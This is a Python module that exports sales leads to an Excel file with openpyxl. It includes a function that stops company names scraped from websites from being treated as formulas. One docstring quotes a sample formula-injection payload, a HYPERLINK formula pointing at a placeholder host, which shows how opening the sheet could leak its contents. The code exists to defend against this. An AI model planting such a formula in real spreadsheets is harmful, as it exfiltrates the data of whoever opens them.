"""Exportação dos leads para um arquivo Excel (.xlsx).

Usa openpyxl para gerar a planilha sem necessidade do Microsoft Office,
mantendo a portabilidade entre Windows, Mac e Linux.
"""

from __future__ import annotations

import logging
from pathlib import Path

from openpyxl import Workbook
from openpyxl.styles import Font
from openpyxl.utils import get_column_letter

from .models import EXCEL_COLUMNS, Lead


def export_to_excel(
    leads: list[Lead],
    output_path: str | Path,
    columns: list[str] | None = None,
    sheet_name: str = "Leads",
    logger: logging.Logger | None = None,
) -> Path:
    """Escreve os leads em um arquivo Excel e devolve o caminho gerado.

    Cria os diretórios de destino se ainda não existirem. ``columns`` define
    quais colunas (e em que ordem) exportar; por padrão usa ``EXCEL_COLUMNS``.
    """
    log = logger or logging.getLogger("prospectai")
    columns = columns or EXCEL_COLUMNS
    path = Path(output_path)
    path.parent.mkdir(parents=True, exist_ok=True)

    workbook = Workbook()
    sheet = workbook.active
    sheet.title = sheet_name

    # Cabeçalho em negrito.
    sheet.append(columns)
    for cell in sheet[1]:
        cell.font = Font(bold=True)

    # Linhas de dados, respeitando a ordem das colunas.
    for lead in leads:
        row = lead.to_row()
        sheet.append([row[column] for column in columns])
        _neutraliza_formulas(sheet[sheet.max_row])

    _autosize_columns(sheet, columns)

    workbook.save(path)
    log.info("Excel gerado com %d lead(s): %s", len(leads), path.resolve())
    return path


def _neutraliza_formulas(linha) -> None:
    """Impede que o conteúdo de um lead vire FÓRMULA na planilha.

    O nome da empresa é lido do ``<title>`` do site DELA: conteúdo de terceiro.
    Um título como ``=HYPERLINK("http://algo/?"&A1,"clique")`` é gravado pelo
    openpyxl como fórmula de verdade e roda quando o vendedor abre o arquivo —
    dá para exfiltrar a planilha inteira (WEBSERVICE/HYPERLINK) ou disparar DDE.

    Marcar a célula como TEXTO resolve sem sujar o dado: o valor continua
    idêntico na tela, só não é interpretado. Prefixar com apóstrofo também
    funcionaria, mas apareceria no conteúdo e estragaria telefones ``+55``.
    """
    for cell in linha:
        if isinstance(cell.value, str) and cell.value[:1] in ("=", "+", "-", "@"):
            cell.data_type = "s"


def _autosize_columns(sheet, columns: list[str], max_width: int = 80) -> None:
    """Ajusta a largura das colunas ao maior conteúdo (com um teto razoável)."""
    for index, column in enumerate(columns, start=1):
        longest = len(column)
        for cell in sheet[get_column_letter(index)]:
            value = cell.value
            if value is not None:
                longest = max(longest, len(str(value)))
        sheet.column_dimensions[get_column_letter(index)].width = min(longest + 2, max_width)
